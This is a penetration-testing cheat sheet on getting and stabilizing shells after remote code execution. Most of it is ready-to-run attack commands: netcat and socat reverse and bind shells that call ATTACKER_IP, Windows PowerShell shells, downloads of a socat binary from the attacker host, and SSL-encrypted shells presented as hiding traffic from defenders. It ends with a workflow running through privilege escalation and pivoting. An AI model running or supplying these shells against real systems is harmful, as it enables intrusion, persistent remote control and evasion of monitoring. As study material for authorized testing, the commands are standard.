
---

# Shells & Listeners Cheat Sheet

## Goal

After achieving **Remote Code Execution (RCE)**, your objective is to obtain a stable shell that allows you to:

* Enumerate the system
* Transfer files
* Escalate privileges
* Pivot to other hosts
* Maintain reliable access

> **RCE ≠ Compromise**
>
> Code execution only proves you can run commands. A stable shell lets you control the machine.

---

# Shell Types

## Reverse Shell (Most Common)

### How it Works

The **target connects back to you.**

```
Target ---------------> Attacker
        Outbound TCP
```

You start a listener.

Victim connects.

You receive the shell.

### Why Reverse Shells?

✔ Most firewalls allow outbound traffic.

✔ Works behind NAT.

✔ You control the listening port.

### Attacker

```bash
nc -lvnp 4444
```

### Target

```bash
nc <ATTACKER_IP> 4444 -e /bin/bash
```

Example

```bash
nc 10.10.10.5 4444 -e /bin/bash
```

---

## Bind Shell

### How it Works

Target opens a listening port.

You connect to it.

```
Attacker -------------> Target
          Inbound TCP
```

### When to Use

* Outbound traffic blocked
* Inbound traffic allowed
* Port forwarding exists

### Target

```bash
nc -lvnp 8080 -e /bin/bash
```

### Attacker

```bash
nc <TARGET_IP> 8080
```

---

# Reverse vs Bind

| Reverse                               | Bind                          |
| ------------------------------------- | ----------------------------- |
| Victim initiates connection           | Attacker initiates connection |
| Better behind NAT                     | Requires reachable target     |
| Works through outbound firewall rules | May be blocked by firewall    |
| Most common                           | Less common                   |

**Rule of Thumb**

Always try **Reverse Shells first.**

---

# Netcat (nc)

## Purpose

The fastest way to:

* Catch shells
* Connect to shells
* Transfer files
* Test ports

Think of Netcat as:

> A network pipe.

---

## Listener

```bash
nc -lvnp 4444
```

Flags

```
-l Listen

-v Verbose

-n No DNS

-p Port
```

---

## Reverse Shell

Listener

```bash
nc -lvnp 4444
```

Victim

```bash
nc ATTACKER_IP 4444 -e /bin/bash
```

---

## Bind Shell

Victim

```bash
nc -lvnp 8080 -e /bin/bash
```

Attacker

```bash
nc TARGET_IP 8080
```

---

## Useful Flags

```
-u UDP

-w Timeout

-q Close after EOF
```

---

## Netcat Variants

Some versions remove:

```
-e
```

(OpenBSD Netcat)

If missing, use:

* Named pipes
* Bash reverse shell
* Socat
* Python

---

# Ncat

Nmap's version of Netcat.

Advantages

* SSL/TLS
* Proxy support
* IPv6
* Better features

---

# rlwrap

Problem

Raw Netcat shells:

❌ No history

❌ No arrow keys

❌ No tab completion

Solution

```bash
rlwrap nc -lvnp 4444
```

Now you have:

✔ History

✔ Arrow keys

✔ Better editing

Always use rlwrap if available.

---

# Socat

Think of Socat as:

> Netcat on steroids.

Advantages

✔ PTY allocation

✔ SSL encryption

✔ Signal handling

✔ Interactive terminals

✔ Better stability

---

# Socat Reverse Shell

Attacker

```bash
socat TCP-L:443 -
```

Victim

```bash
socat TCP:ATTACKER_IP:443 EXEC:"bash -li"
```

---

# Windows Reverse Shell

```powershell
socat TCP:ATTACKER_IP:443 EXEC:powershell.exe,pipes
```

---

# Socat Bind Shell

Victim

```bash
socat TCP-L:8088 EXEC:"bash -li"
```

Attacker

```bash
socat TCP:TARGET_IP:8088 -
```

---

# Why Socat?

Unlike Netcat it supports:

* Vim
* Nano
* SSH
* su
* Job control
* Ctrl+C
* Interactive programs

---

# Shell Stabilization

Raw shells are terrible.

Problems

❌ No Ctrl+C

❌ No Tab

❌ Broken editors

❌ Broken SSH

❌ Broken SU

Goal

Convert:

```
Dumb Shell
```

into

```
Real TTY
```

---

## Step 1 — Spawn PTY

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Step 2 — Set TERM

```bash
export TERM=xterm
```

---

## Step 3 — Suspend Shell

```
CTRL+Z
```

---

## Step 4 — Local Terminal

```bash
stty raw -echo
```

---

## Step 5

```bash
fg
```

---

## Step 6

Find local size

```bash
stty size
```

Example

```
50 220
```

Victim

```bash
stty rows 50 cols 220
```

---

## Restore Terminal

When finished

```bash
stty sane
```

If terminal breaks

```bash
reset
```

---

# Better Listener

Instead of

```bash
nc -lvnp 4444
```

Use

```bash
rlwrap nc -lvnp 4444
```

Much better experience.

---

# Fully Interactive Shell (Socat)

Listener

```bash
socat TCP-L:5555 FILE:`tty`,raw,echo=0
```

Victim

```bash
/tmp/socat TCP:ATTACKER_IP:5555 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

Options Explained

```
pty       Real terminal

stderr    Forward errors

sigint    Ctrl+C works

setsid    Job control

sane      Normal terminal
```

Result

Feels almost identical to SSH.

---

# File Transfer (Socat Binary)

Host file

```bash
python3 -m http.server 80
```

Victim

```bash
wget http://ATTACKER_IP/socat -O /tmp/socat

chmod +x /tmp/socat
```

Windows

```powershell
Invoke-WebRequest -Uri http://ATTACKER_IP/socat.exe -OutFile C:\Windows\Temp\socat.exe
```

---

# Encrypted Shells (SSL)

Why?

Normal shells are plaintext.

Blue Team can:

* Read commands
* Detect Netcat
* Inspect traffic

SSL hides everything.

Traffic looks like HTTPS.

---

# Generate Certificate

```bash
openssl req -newkey rsa:2048 -nodes \
-keyout shell.key \
-x509 \
-days 365 \
-out shell.crt
```

Combine

```bash
cat shell.key shell.crt > shell.pem
```

---

# Encrypted Reverse Shell

Listener

```bash
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 -
```

Victim

```bash
socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:/bin/bash
```

---

# Windows SSL Shell

```powershell
socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:powershell.exe,pipes
```

---

# Encrypted Bind Shell

Victim

```bash
socat OPENSSL-LISTEN:8443,cert=/tmp/shell.pem,verify=0 EXEC:"bash -li"
```

Attacker

```bash
socat OPENSSL:TARGET_IP:8443,verify=0 -
```

---

# Encrypted Interactive TTY

Listener

```bash
socat OPENSSL-LISTEN:443,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0
```

Victim

```bash
socat OPENSSL:ATTACKER_IP:443,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane
```

Best possible shell.

✔ Interactive

✔ Stable

✔ Encrypted

✔ Looks like HTTPS

---

# Choosing the Right Tool

| Situation                             | Tool                  |
| ------------------------------------- | --------------------- |
| Need quick access                     | Netcat                |
| Better usability                      | rlwrap + Netcat       |
| Stable interactive shell              | Socat                 |
| Long engagement / stealth             | Socat + SSL           |
| Advanced payloads & post-exploitation | Msfvenom + Metasploit |

---

# Engagement Workflow

```text
Find RCE
      │
      ▼
Catch Reverse Shell
(nc -lvnp)
      │
      ▼
Spawn PTY
(python3 -c 'import pty...')
      │
      ▼
export TERM=xterm
      │
      ▼
stty raw -echo
      │
      ▼
Fix terminal size
      │
      ▼
Upgrade to Socat TTY
      │
      ▼
Upgrade to Encrypted SSL Shell
      │
      ▼
Enumerate → PrivEsc → Pivot
```

---

# Quick Commands

```bash
# Listener
nc -lvnp 4444

# Reverse shell
nc ATTACKER_IP 4444 -e /bin/bash

# Spawn PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Fix terminal
export TERM=xterm
stty raw -echo
stty sane

# Better listener
rlwrap nc -lvnp 4444

# HTTP server
python3 -m http.server 80

# Download socat
wget http://ATTACKER_IP/socat -O /tmp/socat
chmod +x /tmp/socat

# SSL cert
openssl req -newkey rsa:2048 -nodes \
-keyout shell.key -x509 -days 365 \
-out shell.crt

cat shell.key shell.crt > shell.pem
```

> **Engagement Tip:** During a real assessment, the fastest path is usually **RCE → Netcat reverse shell → Python PTY stabilization → `rlwrap`/`stty` fixes → Socat TTY (if available) → SSL-encrypted Socat for longer operations.** This progression minimizes downtime and gives you a shell that's comfortable enough for enumeration, privilege escalation, and pivoting.
